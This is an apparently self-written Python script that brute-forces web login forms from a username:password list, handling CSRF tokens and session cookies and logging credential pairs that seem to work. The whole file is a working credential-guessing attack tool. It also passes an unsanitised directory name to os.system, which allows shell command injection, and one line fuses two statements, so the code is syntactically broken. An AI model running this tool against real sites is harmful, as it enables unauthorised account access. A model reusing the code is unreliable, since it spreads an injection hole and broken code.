#!/usr/bin/python3
#Library to create HTTP requests, parse HTTP responses, and scrap HTTP pages for content
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from bs4 import BeautifulSoup
#Library of regular expressions to help find or match other strings.
import re
#Library to ingest command-line input
import sys
#Colorama is used to just color CMD line output for successes
import colorama
#Fore is for the color of the text and Style is to reset the Fore variable after finding a successfull credential pair.
from colorama import Fore, Style
#Library used to easily capture and organize flags used by the program for arguments received via the command line.
import argparse
#Used to issue system commands to create a sub-folder for storage of this brute forcer artifacts.
import os

#Declare the parser variable and include a description of how to use the program if the user uses in the -h / --help flags.
parser = argparse.ArgumentParser(description='Usage: Web_Brute_Force_2.py [-f/--file] User:Pass file location -U/--URL URL address.')
#Define arguments that can be used by the program.  -f/--file is the file location of the colon seperated username:password file. -U/--URL is the URL to the web application login form.  -k/--keyword is the keyword used to identify failed login attempts.
parser.add_argument('-f', '--file', action="store", dest="up_file_var", required=True, metavar='User:Pass File', help='The location of the colon seperated username:password list to be tried against the HTTP(s) login form.')
parser.add_argument('-U', '--URL', action="store", dest="URL_var", required=True, metavar='Login URL', help='The URL location where the login form is located.')
parser.add_argument('-uP', '--user', action="store", dest="user_param_var", metavar='User Paramter', help='The username paramter in the HTTP request.')
parser.add_argument('-pP', '--pass', action="store", dest="pass_param_var", metavar='Password Parameter', help='The password parameter in the HTTP request.')
parser.add_argument('-k', '--keyword', action="store", dest="keyword_var", required=True, metavar='Failed Attempt Keyword', help='The keyword for the script to search for on an HTTP response package to confirm the login attempt failed.')
parser.add_argument('-t', '--token', action="store", dest="token_name_var", metavar='CSRF Token', help='The csrf token parameter in the HTTP request.')
parser.add_argument('-o', '--outdirectory', action="store", dest="outdir_var", metavar='Output Directory Location', help='The output directory containing the results of the script execution.')
parser.add_argument('-id', '--session-id', action="store", dest="session_id_var", metavar='Session ID', help='The session ID that should be used during authentication process.')
#Pass the argument values from the command line to the args variable for later calling.
args = parser.parse_args()

#Create a sub-directory for storage of all the artifacts
os.system("mkdir " + args.outdir_var + "; cd " + args.outdir_var + ";")

#Accessing the username:password text file   
up_file = open(args.up_file_var,"r")
#Create / open the output file to hold the results of the command.
out_file = open("./" + args.outdir_var + "/results.txt","w+")
#Create / open the output file for the example of what a response looks like when there is a failed login attempt.
failure_example_file = open("./" + args.outdir_var + "/failure.txt","w+")
#Create / open the output file for what the response looks like when there is a successfull login attempt.
success_file = open("./" + args.outdir_var + "/success.txt","w+")

#Set up an HTTP(s) session with the requests library.
s = requests.session()
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

#Send a purposefully incorrect login attempt to store and write to an output file what the response looks like for the failed attempt.
login_parameter_values = {args.user_param_var: "brwnshoecrew9001", args.pass_param_var: "brwnshoecrew9002"}
failure_example = s.post(args.URL_var, data=login_parameter_values, verify=False, allow_redirects=True)
#Need to convert the header and response code values to strings so that we can print them to the output file.
failure_example_header = str(failure_example.headers)
failure_response_code = str(failure_example.status_code)
failure_example_file.write("-------HEADER-------\n\n %s \n\n-------RESPONSE CODE-------\n\n %s \n\n-------BODY-------\n\n %s" % (failure_example_header, failure_response_code, failure_example.text))

#Iterate through the username:password text file.   
for Login_Combo in up_file:   

    #Split the line into an array called "fields" using the ":" as a separator.
    fields = Login_Combo.split(":")   
    #Extract the username and password from the colon seperated file and assign them to different columns of the array.   
    File_User = fields[0]   
    File_Password = fields[1]   

    if args.session_id_var != None:
        if args.token_name_var != None:
            csrf_response = requests.get(args.URL_var)
            soup = BeautifulSoup(csrf_response.content, 'html.parser')
            for result in soup.find_all(attrs={"name":args.token_name_var}):
                token = result.get('value')
            auth_cookie = {args.session_id_var: requests.utils.dict_from_cookiejar(csrf_response.cookies)[args.session_id_var]}
            login_parameter_values = {args.user_param_var: File_User, args.pass_param_var: File_Password[:-1], args.token_name_var: token}
            r = s.post(args.URL_var, data=login_parameter_values, verify=False, cookies=auth_cookie, allow_redirects=True)
        else:
            session_id_response = requests.get(args.URL_var)    
            auth_cookie = {args.session_id_var: requests.utils.dict_from_cookiejar(session_id_response.cookies)[args.session_id_var]}
            login_parameter_values = {args.user_param_var: File_User, args.pass_param_var: File_Password[:-1]}
            r = s.post(args.URL_var, data=login_parameter_values, verify=False, cookies=auth_cookie, allow_redirects=True)
    else:
            login_parameter_values = {args.user_param_var: File_User, args.pass_param_var: File_Password[:-1]}
            r = s.post(args.URL_var, data=login_parameter_values, verify=False, allow_redirects=True)
    
    #After making the POST request with a username and password combination, scrap the HTTP response packet to identify if the keyword for failed logins is present or not.
    if args.keyword_var in r.text: 
       	#If the failed login attempt keyword is found in the HTTP response then print the failed login attempt username and password.
        print("Invalid Login %s:%s" % (File_User,File_Password[:-1]))
	#Write same results to outdir.
        out_file.write("Invalid Login %s:%s\n" % (File_User,File_Password[:-1]))
	#Clear the cookies of the browser client used by the requests library before trying to authenticate again.
        s.cookies.clear 
    else: 
	#If the failed login attempt keyword is NOT found, then the login attempt was presumed to be successfull.  Print the assumed success username:password combination, indent from the failed login attempt CLI output, and color it in green text color to stand out.
        print(Fore.GREEN + "+++++++++++++++++++++Success %s:%s" % (File_User,File_Password[:-1]) + Style.RESET_ALL)
	#Write same results to outfile.
        out_file.write("+++++++++++++++++++++Success %s:%s\n" % (File_User,File_Password[:-1]))
	success_header = str(r.headers)success_response_code = str(r.status_code)
	success_file.write("-------HEADER-------\n\n %s \n\n-------RESPONSE CODE-------\n\n %s \n\n-------BODY-------\n\n %s" % (success_header, success_response_code, r.text))
	break

#It is good practice to close the files at the end to free up resources      
up_file.close()
out_file.close()
failure_example_file.close()
success_file.close()
#Print the CLI when the script is done in red text.
print(Fore.RED + "Brute force is complete\n" + Style.RESET_ALL)
